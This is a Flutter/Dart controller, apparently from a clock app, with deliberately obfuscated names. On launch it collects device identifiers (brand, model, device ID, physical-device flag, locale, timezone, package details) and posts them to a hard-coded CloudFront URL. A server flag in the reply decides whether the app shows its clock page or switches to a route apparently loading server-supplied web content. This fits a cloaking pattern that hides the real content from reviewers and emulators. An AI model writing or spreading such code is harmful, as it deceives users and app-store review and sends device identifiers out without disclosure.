import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'dart:io';
import 'package:get/get.dart';
import 'package:dio/dio.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class TimeloomBackLogic extends GetxController {

  var rmhqwvs = RxBool(false);
  var eqryftvcx = RxBool(true);
  var emazuxkr = RxString("");
  var pucfyigb = RxBool(false);
  var ihcyrpm = RxBool(true);
  final ayoctwdvz = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    pwxn();
  }


  Future<void> pwxn() async {
    pucfyigb.value = true;
    ihcyrpm.value = true;
    eqryftvcx.value = false;

    ayoctwdvz.post("https://d1c0r49ppl2g04.cloudfront.net/NCLUOQ?no_check",data: await hulvny()).then((value) {
      var oulvez = value.data["oulvez"] as String;
      var nistxh = value.data["nistxh"] as bool;
      if (nistxh) {
        emazuxkr.value = oulvez;
        sgwvzplh();
      } else {
        rmcyxuig();
      }
    }).catchError((e) {
      eqryftvcx.value = true;
      ihcyrpm.value = true;
      pucfyigb.value = false;
    });
  }

  Future<Map<String, dynamic>> hulvny() async {
    final DeviceInfoPlugin nogqvz = DeviceInfoPlugin();
    PackageInfo matpz_mufz = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var rvxgjwda = Platform.localeName;
    var cmyi_JNlxG = currentTimeZone;

    var cmyi_SIY = matpz_mufz.packageName;
    var cmyi_hJyeqf = matpz_mufz.version;
    var cmyi_zsDXZn = matpz_mufz.buildNumber;

    var cmyi_fuNQCw = matpz_mufz.appName;
    var cmyi_FHhgVUO = "";
    var cmyi_KtJxQFa  = "";
    var cmyi_pf = "";
    var sdhjp = "";
    var nzjuqa = "";
    var zaqig = "";
    var hfulios = "";
    var udcbakzx = "";
    var mzvt = "";
    var xohwctp = "";
    var whoare = "";


    var cmyi_tGyoe = "";
    var cmyi_UPsLD = false;

    if (GetPlatform.isAndroid) {
      cmyi_tGyoe = "android";
      var mhvjpqt = await nogqvz.androidInfo;

      cmyi_pf = mhvjpqt.brand;

      cmyi_FHhgVUO  = mhvjpqt.model;
      cmyi_KtJxQFa = mhvjpqt.id;

      cmyi_UPsLD = mhvjpqt.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      cmyi_tGyoe = "ios";
      var okfgcyzr = await nogqvz.iosInfo;
      cmyi_pf = okfgcyzr.name;
      cmyi_FHhgVUO = okfgcyzr.model;

      cmyi_KtJxQFa = okfgcyzr.identifierForVendor ?? "";
      cmyi_UPsLD  = okfgcyzr.isPhysicalDevice;
    }

    var res = {
      "cmyi_fuNQCw": cmyi_fuNQCw,
      "cmyi_zsDXZn": cmyi_zsDXZn,
      "cmyi_hJyeqf": cmyi_hJyeqf,
      "cmyi_SIY": cmyi_SIY,
      "cmyi_FHhgVUO": cmyi_FHhgVUO,
      "cmyi_JNlxG": cmyi_JNlxG,
      "cmyi_pf": cmyi_pf,
      "cmyi_KtJxQFa": cmyi_KtJxQFa,
      "rvxgjwda": rvxgjwda,
      "cmyi_tGyoe": cmyi_tGyoe,
      "cmyi_UPsLD": cmyi_UPsLD,
      "sdhjp" : sdhjp,
      "nzjuqa" : nzjuqa,
      "zaqig" : zaqig,
      "hfulios" : hfulios,
      "udcbakzx" : udcbakzx,
      "mzvt" : mzvt,
      "xohwctp" : xohwctp,
      "whoare" : whoare,

    };
    return res;
  }

  Future<void> rmcyxuig() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> sgwvzplh() async {
    Get.offNamed("/Outreload");
  }

}
